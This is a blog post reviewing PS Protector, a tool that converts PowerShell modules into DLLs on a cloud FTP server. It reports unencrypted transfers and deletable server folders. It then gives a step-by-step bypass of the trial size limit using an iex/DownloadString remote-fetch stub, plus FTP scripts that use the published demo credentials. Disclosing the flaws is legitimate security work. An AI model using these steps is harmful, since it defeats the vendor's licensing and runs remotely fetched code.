---
layout: post
title:  "PS Protector: PowerShell Module Builder"
summary: "Convert your PowerShell module into a .NET assembly DLL"
author: guillaume
date: '2023-10-10'
category: ['powershell','scripts', 'firewall', 'network', 'psprotector', 'assembly', 'executable']
tags: powershell, scripts, resources, binary
thumbnail: /assets/img/posts/psprotector/main_s.jpg
keywords: powershell, scripts, resources, binary
usemathjax: false
permalink: /blog/using-psprotector/

---


### Overview 

[PS Protector](https://www.psprotector.com/) is a small Windows utility that simplifies converting your PowerShell .psm module file(s) into Windows .NET dynamic-link library (DLL) assemblies.

PS Protector is the work of a Swiss developer named Stefan Soller. Let's learn how to use the tool.

-------------------

### Protecting a PowerShell module

Let's begin by writing a simple test function using PowerShell 5.1 Desktop on my Windows 10 workstation:

```
  Function Test-Function()
  {
      Write-Output -InputObject 'If you can read this message, then the Test-Function function ran correctly.'
  }
  Export-ModuleMember -Function *
```

<center>
<img src="https://arsscriptum.github.io/assets/img/posts/psprotector/Sign-into-PS-Protector.png" alt="table" />
</center>
<br>


Next, download the [PS Protector free trial](https://www.psprotector.com/downloads/). PS Protector comes down as a 400 KB standalone executable along with a simple .config file. Upon launch, you're required to sign into the PS Protector web API. Here are the trial credentials as listed on [their website](https://www.psprotector.com/demo/):

 - **UserID:** demo
 - **Password:** rWf1+ccFx!p2a0e


The trial license lets you protect PowerShell modules that contain no more than 200 characters.

You will receive your own PS Protector credentials when you purchase a license (we'll discuss pricing at the end of this product review). Note that signing into PS Protector is mandatory; if you don't have an internet connection, or if the PS Protector web API is unavailable, you'll see the error shown in the next screenshot.


<center>
<img src="https://arsscriptum.github.io/assets/img/posts/psprotector/You-need-to-be-online-to-use-PS-Protector.png" alt="table" />
</center>
<br>


Incidentally, the difficult-to-read text in the previous screenshot says Service Status: Offline - Please try again later.

Okay—now it's time to protect our test module. Fill out the Output Settings form to get started; notice the next screenshot, and then I'll explain the major configuration options.




<center>
<img src="https://arsscriptum.github.io/assets/img/posts/psprotector/Protect-a-PowerShell-module-600x602.png" alt="table" />
</center>
<br>



- A: You can save your work as a project file to make protecting the same module for different customers easier.
- B: The input file needs to be a .psm1 PowerShell module; the output file is a .dll for which you provide a name and location.
- C: This is metadata attached to your new protected assembly.
- D: You can display a customized message when a user or customer imports the module.
- PS Protector also provides command line support. You can pass all information as command line arguments to fully automate the creation of the assembly. In case of success or errors error codes are returned.

The [PS Protector FAQ](https://www.psprotector.com/faq/) offers information how the tool protects the assembly against the use of .NET Decompilers such as [Jetbrains dotPeek](https://www.jetbrains.com/decompiler/), [Redgate .NET Reflector](https://www.red-gate.com/products/dotnet-development/reflector/index) and [ILSpy](https://github.com/icsharpcode/ILSpy).  However, the company provides no details how the code is encrypted.

Anyway, you can optionally include licensing information, as shown in the next interface screenshot.


<center>
<img src="https://arsscriptum.github.io/assets/img/posts/psprotector/Add-license-details-for-your-customer-600x594.png" alt="table" />
</center>
<br>

The idea here is you can put a license timeframe and personalization when you sell your protected assembly to customers. Well, let's test!


<br>

-------------------

<br>



### Testing the module protection

Put your new .dll and any related assets into a folder, and place that folder in a known PowerShell module path. To get these paths in Windows 10, run the following statement from an elevated PowerShell session:

```powershell
  $env:PSModulePath -split (';')
  C:\Users\tim\Documents\WindowsPowerShell\Modules
  C:\Program Files\WindowsPowerShell\Modules
  C:\windows\system32\WindowsPowerShell\v1.0\Modules
```

You can then run ```Import-Module``` to load the assembly's contents into your runspace. For example, you can see in the next figure, I successfully imported my test module and ran its exported test function.



<center>
<img src="https://arsscriptum.github.io/assets/img/posts/psprotector/Test-the-protected-module-600x184.png" alt="table" />
</center>
<br>


Note also that PS Protector lists the licensee and expiration date because I chose those options during the protection operation. If users attempt to access the protected assembly after the license period expires, they see output shown in the next screenshot.



<center>
<img src="https://arsscriptum.github.io/assets/img/posts/psprotector/Test-an-expired-license-600x281.png" alt="table" />
</center>
<br>


### So how does an Encrypted module look ? Is the ILSpy decompiled code readable ? 

Take a look for yourself! Reverse-engineering the PowerShell code of the module with the converted Dll will be pretty difficult...

<br>
<center>
<img src="https://arsscriptum.github.io/assets/img/posts/psprotector/ilspy.gif" alt="table" />
</center>
<br>


<br>

-------------------

<br>


## HOW DOES THE SYSTEM WORKS ?

This section describes how the system works, as I understand it.

### Notes

The system is pretty straighforward. Some initial notes:

1. The Module processing is done on the cloud, nothing is done locally.
2. The communication is done though the FTP protocol.
3. There is currently a bug causing all the traffic between client-server to be un-encrypted. ***I will describe the bug further down, and how to fix it***

<br>

### Flow

1. When converting a file, the app will first generate an ***XML DEFINITION FILE*** that looks like [this](https://arsscriptum.github.io/ps/Module_Def.xml)
2. It will name the file like this ```<ModuleName>_<ComputerName>.xml``` Example: ```MyModule_Desktop12.xml```
3. It will take your module psm1 file, and name the file like this ```<ModuleName>_<ComputerName>.psm1``` Example: ```MyModule_Desktop12.psm1```
4. It will upload both files on the cloud server in the ```/Input``` folder
5. There is a running service application watching that folder, when 2 files are deected, it will remove them, and process the conversion.
6. Upon a successfull conversion, the **DLL** will be copied in the ```/Output``` directory.
7. During this time, the application reconnects at every 2 seconds to check if the file was deposited in the /Output folder.
8. When detecting the file in the ```/Output``` folder, it will download it, then delete the server-side version of it.
9. The DLL is now in the client possession.
10. ***IMPORTANT I am not aware if the client's code (powershell module code) is kept in a separate folder on the cloud server. This is very much possible***

<br>

### Flow Image


<center>
<img src="https://arsscriptum.github.io/assets/img/posts/psprotector/app_xfers.png" alt="app_xfers" />
</center>
<br>


<center>
<a href="https://arsscriptum.github.io/assets/img/posts/psprotector/flow_big.png"><img src="https://arsscriptum.github.io/assets/img/posts/psprotector/flow_small.png"></a>
</center>
<br>


<br>

-------------------

<br>



### BUGS 
<br>

#### Bug-001 - Transfer of vital client's data unencrypted over insecure network

<br>
***SEVERITY*** 

_Critical: the trust that users have. Affecting reputation._

***DESCRIPTION***

The whole point of this software is to *protect a client's intellectual property* . Unfortunately
the fact that it sends the bulk of the client code that he wants to protect in clear over insecure networks
is a major issue that would cause most clients to stop using the software.

***DETAILS***

With the FTP protocol, the client-server exchanges can be encrypted, this is done when the client initiate
a **TLS AUTH** request and that a TLS Handshake is accomplished. All further traffic will be encrypted using 
a symmetric encryption algorithm after the key exchange.

The program **ACTUALL DOES THIS** , but there is a bug that causes the client to **always disconnect** after the TLS
handshake. Upon reconnection, the client doesn't call ***TLC AUTH*** again. To fix this problem this needs to happen:
1. Find out why the client disconnects from the server systematically after every TLS Handshake, fix that.
2. Ensure that if a disconnection DO occur, due to network error, or such, a TLS AUTH request is sent again upon reconnection.

<br>


#### Bug-002 - Possibility by a malicious user to disable the DEMO functionality for everyone

<br>

***SEVERITY*** 

 _Major: Bug capable of disabling parts of the system_ 

***DESCRIPTION***

It is possible for anyone to break the system so that any users with demo license can't use the system.

***DETAILS***

As mentionned above, the system works by uploading 2 files on the server in the /Input folder. Then waiting for the generated assembly
to be created in the /Output folder.
As of this moment, those 2 folders have read/write permissions from everyone. If some user connects to the server using a client like
WinSCP, or uses any other FTP client, and **DELETE the INPUT DIRECTORY** All the *PsProtector applications* will return an error when attempting
a conversion. The error is **INVALID LOCATION** returned by the FTP server, when the client uploads his files.

To fix this issue, the Input and Output folders would need to be writable by everyone in them, but the folder themselves need to be protected from deletion except from the Administrator.



<br>

-------------------

<br>


## Exploiting unresolved bugs and software vulnerabilities

I did an extensive analysis of PSProtector app, along with the backend service, traffic analysis using [WireShark](https://www.wireshark.org/) and various tests.
This gave me intimate knowledge of how the system works and how to exploit some bugs in order to unlock full functionalities without a license.

<br>
<br>

### Procesing Modules bigger than 200 bytes in Demo mode

Let's begin by addressing the 200 characters limit in demo mode. The restriction is done *both on the client-side and the server-side* which is how it should be, however, the check on the server-side is done **by calculating the size of the file before processing it**. This is a bug because the server should check the size of the **data to be processed**, the script code to be compiled. **Not the content of the script**. You may be confused, but there is a nuance.

We can trick the server into downloading our script. To do this, you need a personal website, or a public [github](https://github.com/) repository.

1. Create a text file containing the module to be compiled. It can be a ```.psm1``` or a ```.txt``` file in case you use a website and you don't have a PSM1 [Mime Type](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types/Common_types) . I personally dumped my PSM1 file in a txt file.
2. Upload your text file to your website, or your [github](https://github.com/) repository. Grab the URL that links to your file.
3. Locally create a ```.psm1``` module file that you will convert with PSProtector. Make it's content like this:

```powershell

    iex ((New-Object System.Net.WebClient).DownloadString(" <url of he file you uploaded> "))

```

<br>

Here's a working example that you can use to test: the url of the file is [https://arsscriptum.github.io/ps/Cryptography.txt](https://arsscriptum.github.io/ps/Cryptography.txt)

<center>
<img src="https://arsscriptum.github.io/assets/img/posts/psprotector/trick.png" alt="table" />
</center>
<br>

4. Once you've created the local ```.psm1``` file and that the online file is reachable, you can proceed by compiling the module like you would do normally.
5. You will receive a ```.dll``` . Just follow the steps described above to import the binary module.


<br>

-------------------

<br>


### Converting via PowerShell Scripts

To automate the conversion with PowerShell, we need to implemente basic FTP functionalities: Upload, Download and check for file (test presence).

Here are the function you can use:


#### Download from cloud.psprotector.com

```powershell
    # DOWNLOAD A FILE FROM THE PSPROTECTOR CLOUD FTP SERVER
    function Download-FromPsProtectorCloud {
        [CmdletBinding(SupportsShouldProcess)]
        param(
            [Parameter(Mandatory=$true, position = 0)]
            [string]$Remote,
            [Parameter(Mandatory=$true, position = 1)]
            [string]$Local,
            [Parameter(Mandatory=$false)]
            [switch]$Delete
        )
       
        try{    
            
            # Create a FTPWebRequest
            $FTPRequest = [System.Net.FtpWebRequest]::Create($Remote)
            $FTPRequest.Credentials =  [System.Net.NetworkCredential]::new("demo", "rWf1+ccFx!p2a0e");
            $FTPRequest.Method = [System.Net.WebRequestMethods+Ftp]::DownloadFile
            $FTPRequest.UseBinary = $true
            $FTPRequest.KeepAlive = $false
            # Send the ftp request
            $FTPResponse = $FTPRequest.GetResponse()
            Write-Host "Downloaded `"$Remote`"" -f Yellow
            # Get a download stream from the server response
            $ResponseStream = $FTPResponse.GetResponseStream()
            # Create the target file on the local system and the download buffer
            $LocalFileFile = [IO.FileStream]::new($Local,[IO.FileMode]::Create)
            [byte[]]$ReadBuffer = New-Object byte[] 1024
            # Loop through the download
            do {
                $ReadLength = $ResponseStream.Read($ReadBuffer,0,1024)
                $LocalFileFile.Write($ReadBuffer,0,$ReadLength)
            }
            while ($ReadLength -ne 0)
            $LocalFileFile.Close()
            $LocalFileFile.Dispose()
            Write-Host "Wrote `"$Local`"" -f Magenta
            $LocalFileFile
            if($Delete){
                $FTPDeleteRequest = [System.Net.FtpWebRequest]::Create($Remote)
                $FTPDeleteRequest.Credentials =  [System.Net.NetworkCredential]::new("demo", "rWf1+ccFx!p2a0e");
                $FTPDeleteRequest.Method = [System.Net.WebRequestMethods+Ftp]::DeleteFile
                $FTPDeleteRequest = $FTPRequest.GetResponse()
                Write-Host "Deleted `"$Remote`"" -f Magenta
            }

        }catch{
            Write-Warning "$_"
        }
    }

```
<br>

#### Upload to cloud.psprotector.com

```powershell

    # UPLOAD A FILE TO THE PSPROTECTOR CLOUD FTP SERVER
    function Upload-ToPsProtectorCloud {
        [CmdletBinding(SupportsShouldProcess)]
        param(
            [Parameter(Mandatory=$true, position = 0)]
            [string]$Remote,
            [Parameter(Mandatory=$true, position = 1)]
            [string]$Local
        )
       
        try{    
            
            $request = [System.Net.FtpWebRequest]::Create($remote)
            $request.Credentials = [System.Net.NetworkCredential]::new("demo", "rWf1+ccFx!p2a0e");
            $request.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
            $request.UsePassive = $true
            $fileStream = [System.IO.File]::OpenRead($local)
            $ftpStream = $request.GetRequestStream()
            $fileStream.CopyTo($ftpStream)
            $ftpStream.Dispose()
            $fileStream.Dispose()

        }catch{
            Write-Warning "$_"
        }
    }

```
<br>

#### Check for file

```powershell

    # CHECK FOR FILE PRESENCE ON FTP SERVER
    function Test-FtpModuleReady {
        [CmdletBinding(SupportsShouldProcess)]
        param(
            [Parameter(Mandatory=$true, position = 0)]
            [string]$Remote
        )
        try{      
            $request = [Net.WebRequest]::Create($Remote)
            $request.Credentials = [System.Net.NetworkCredential]::new("demo", "rWf1+ccFx!p2a0e");
            $request.Method = [Net.WebRequestMethods+Ftp]::GetFileSize
            try{
                $request.GetResponse() | Out-Null
                return $True
            }catch{
                $response = $_.Exception.InnerException.Response;
                if ($response.StatusCode -eq [Net.FtpStatusCode]::ActionNotTakenFileUnavailable){
                    Return $False
                }else{
                    Write-Host ("Error: " + $_.Exception.Message)
                }
            }
        }catch{
            Write-Warning "$_"
        }
    }
```
<br>

### XML Definition file

In order to start the server-side conversion, you need to upload 2 files:
1. The PowerShell module script file (.psm1)
2. A XML definition file

#### Generate a XML definition file

Here's a function to generate the required XML file


```powershell
    function Get-ModuleXmlDefinitionFile {
        [CmdletBinding(SupportsShouldProcess)]
        param(
            [Parameter(Mandatory=$true, Position=0)]
            [string]$InputFile,
            [Parameter(Mandatory=$true, Position=1)]
            [string]$OutputFile,
            [Parameter(Mandatory=$false)]
            [string]$Title = "n/a",
            [Parameter(Mandatory=$false)]
            [string]$Description = "n/a",
            [Parameter(Mandatory=$false)]
            [string]$Company = "n/a",
            [Parameter(Mandatory=$false)]
            [string]$Product = "n/a",
            [Parameter(Mandatory=$false)]
            [string]$Copyright = "n/a",
            [Parameter(Mandatory=$false)]
            [string]$LoadMessage = "",
            [Parameter(Mandatory=$false)]
            [System.Version]$Version = "1.0.0.0"
        )
       
        try{    
            $loadmsg_enabled = 'false'
            if([string]::IsNullOrEmpty($LoadMessage) -eq $False){
                $loadmsg_enabled = 'true'
            }
            $xmldata = @"
    <?xml version=`"1.0`" encoding=`"UTF-8`"?>
    <ProjectPreferences xmlns:xsd=`"http://www.w3.org/2001/XMLSchema`" xmlns:xsi=`"http://www.w3.org/2001/XMLSchema-instance`">
       <InputFileName>{0}</InputFileName>
       <DestinationPath>{1}</DestinationPath>
       <AssemblyTitle>{2}</AssemblyTitle>
       <AssemblyDescription>{3}</AssemblyDescription>
       <AssemblyCompany>{4}</AssemblyCompany>
       <AssemblyProduct>{5}</AssemblyProduct>
       <AssemblyCopyright>{6}</AssemblyCopyright>
       <AssemblyVersionMajor>{7}</AssemblyVersionMajor>
       <AssemblyVersionMinor>{8}</AssemblyVersionMinor>
       <AssemblyVersionBuild>{9}</AssemblyVersionBuild>
       <AssemblyVersionRevision>{10}</AssemblyVersionRevision>
       <LicenseEnabled>false</LicenseEnabled>
       <LicenseRegistredTo />
       <LicenseExpiredDateEnabled>false</LicenseExpiredDateEnabled>
       <LicenseExpiredDate>{11}</LicenseExpiredDate>
       <OtherShowLoadingMessageEnabled>$loadmsg_enabled</OtherShowLoadingMessageEnabled>
       <OtherScriptBlockLoggingSettings>0</OtherScriptBlockLoggingSettings>
       <OtherShowLoadingMessage>{12}</OtherShowLoadingMessage>
       <OtherTargetFrameworkSettings>0</OtherTargetFrameworkSettings>
    </ProjectPreferences>
    "@
            $DateStr = Get-Date -UFormat "%m.%d.%Y"
            $xmldata = $xmldata -f $InputFile, $OutputFile, $Title, $Description, $Company, $Product,$Copyright , $Version.Major, $Version.Minor, $Version.Build, $Version.Revision, $DateStr, $LoadMessage
            $xmldata
        }catch{
            Show-ExceptionDetails $_ -ShowStack
        }
    }
```

<br>

As you can see all the arguments are optionals. There only the first 2 arguments that are mandatory in that function, the rest is optional, the file can just be the basic skeleton. I however am used to set the version, and I like to set a ```LoadMessage``` that is printed on screen when I load my module.


<center>
<img src="https://arsscriptum.github.io/assets/img/posts/psprotector/loadmessage.png" alt="table" />
</center>
<br>


<br>

-------------------

<br>


### Putting it all together : Converting module with PowerShell

Below you will find an example of a script that uses the functions above to do a module conversion to binary.

Remember the importants points:

1. Create your own module script file (.psm1) with [this format. Example.](https://arsscriptum.github.io/ps/PowerShell.Module.Downloader.psm1) . 
2. Create a txt file containing all your module functions, and the ```Export-ModuleMember <funcname>```  calls. Or ```Export-ModuleMember -Function *``` to export all functions. [Example](https://arsscriptum.github.io/ps/Downloader.txt) . 
3. Upload the txt file in step 2 to a public github repository or website accessible from internet.
4. Write the Uri to access the txt file in the Module Script file in step 1.
5. Enter the details you need like version number, LoadMessage, Copyright memo in the call to function ```Get-ModuleXmlDefinitionFile```
6. Create both files locally
7. Upload them to the server
8. Wait for the server to prepare your DLL in the ```Output``` folder
9. Download your file and delete from server.
6. Done!



<br>
<center>
<img src="https://arsscriptum.github.io/assets/img/posts/psprotector/module_conversion.gif" alt="table" />
</center>
<br>


```powershell

function Invoke-UploadAndConvert {
    [CmdletBinding(SupportsShouldProcess)]
    param(
        [Parameter(Mandatory=$true, position = 0)]
        [string]$ModuleScriptPath
    )
   
    try{
        
        
        $ModuleIdentifier = (gi "$ModuleScriptPath").Basename
        $TmpString = "{0}.{1}" -f "$ENV:COMPUTERNAME","$ModuleIdentifier"
        
        $CurrentPath = (Get-Location).Path
        $EXPORT_ModuleScriptPath = "{0}\{1}_{2}.psm1" -f "$CurrentPath", "$ModuleIdentifier", "$TmpString"
        Copy-Item "$ModuleScriptPath" "$EXPORT_ModuleScriptPath" -Force
        Write-Host "File 1: `"$EXPORT_ModuleScriptPath`"" -f Magenta

        $EXPORT_XmlFile =  "{0}\{1}_{2}.xml" -f "$CurrentPath",  "$ModuleIdentifier", "$TmpString"
        $in = "c:\{0}.psm1" -f $ModuleName 
        $out = "c:\{0}.dll" -f $ModuleName 
        $LoadMsg = "LOADING TEST MODULE {0}" -f $ModuleName
        #$LoadMsg = $LoadMsg.Replace("`n","``n")
        [System.Version]$Version = "4.1.3.22"
        Get-ModuleXmlDefinitionFile -InputFile "$in" -OutputFile "$out" -Version $Version -Copyright '(c) test' -LoadMessage $LoadMsg | Set-Content "$EXPORT_XmlFile"
        Write-Host "File 2: `"$EXPORT_XmlFile`"" -f Yellow
    
       
        $BaseFtpPath = "ftp://cloud.psprotector.com/Input"

        $SendPath = "{0}/{1}" -f $BaseFtpPath, ((Get-Item "$EXPORT_XmlFile").Name)
        Write-Host "Sending $SendPath" -f DarkCyan
        Upload-ToPsProtectorCloud "$SendPath" "$EXPORT_XmlFile"

        $SendPath = "{0}/{1}" -f $BaseFtpPath, ((Get-Item "$EXPORT_ModuleScriptPath").Name)
        Write-Host "Sending $SendPath" -f DarkCyan
        Upload-ToPsProtectorCloud "$SendPath" "$EXPORT_ModuleScriptPath"
     
        Write-Host "Both Files Uploaded!" -f Red 

        Start-Sleep 1

        $BaseFtpPath = "ftp://cloud.psprotector.com/Output"
        $RemoteDllPath = "{0}/{1}_{2}.dll" -f $BaseFtpPath, "$ModuleIdentifier", "$TmpString"

        $Ready = $False
        While($Ready -eq $False){
            Write-Host "Checking is Dll is Ready $RemoteDllPath..." -n -f DarkCyan
            $Ready = Test-FtpModuleReady "$RemoteDllPath"
            Start-Sleep 3
            if($Ready)
            {
                $Local = "{0}\{1}.dll" -f "$CurrentPath", "$ModuleIdentifier" 
                Write-Host "YES" -f Green
                Download-FromPsProtectorCloud $RemoteDllPath $Local -Delete
                $SystemModulePath = $ENV:PSModulePath.Split(';')[0]
                $Dest = "{0}\{1}" -f $SystemModulePath, $ModuleIdentifier
                mkdir "$Dest" -ea Ignore
                Move-Item "$Local" "$Dest" -Force
                
            }
            else
            {
                Write-Host "No" -f Yellow
            }
        }
        Remove-Item $EXPORT_ModuleScriptPath -EA Ignore
        Remove-Item $EXPORT_XmlFile -EA Ignore


         

    }catch{
        Write-Warning "$_"
    }
}
```



<br>

-------------------

<br>


### Do you Recommend PSPROTECTOR has a production tool to protect your company modules ?

Hard question. Ok, I personally trust the obfuscation/encryption. Once the module is converted, it is very hard to view the original code. 

Where I have an issue with this software is this: the PowerShell code processing is not done on your machine, but it is sent to the PSPROTECTOR Cloud
server for processing. This would not be an issue in itself but there is a bug in the software that causes your module to be sent in clear over the internet
when you submit is for conversion. Yes you heard that right! 

The PowerShell code of your module, the actually code you want to protect by encrypting it is sent from your machine to their servers in CLEAR, for everyone to see.
Now I have contacted the author more than 3 weeks ago but haven't got any replies.

I analysed the network traffic and the application calls and it clear to me that this is a BUG, and this is an EASY FIX. But at the moment, it is NOT FIXED so any modules
you are converting is:
1. Sent in CLEAR over the INTERNET
2. Copy on the PSPROTECTOR Server without any knowledge of it's fate. Is your code archived for a log period on the PSPROTECTOR Cloud ? If so when is it deleted ?

**So before thise issue is fixed, I would not recommend this software for production code.**


<br>
<center>
<img src="https://arsscriptum.github.io/assets/img/posts/psprotector/wireshark.png" alt="wireshark" />
</center>
<br>


<br>

-------------------

<br>


## Get the code 

***IMPORTANT: I Highly suggest you FORK the repo below if you want to test the scripts* Why ? Because you will have your own public github repository
where the script will be uploaded before used.


[PowerShell.PSProtector.Analysis on GitHub](https://github.com/arsscriptum/PowerShell.PSProtector.Analysis)


***Important Note*** Do You have Issues accessing the core repository? **Don't be shy and send me an** [EMAIL to guillaumeplante.qc@gmail.com](mailto:guillaumeplante.qc@gmail.com) **and I will fix access for you**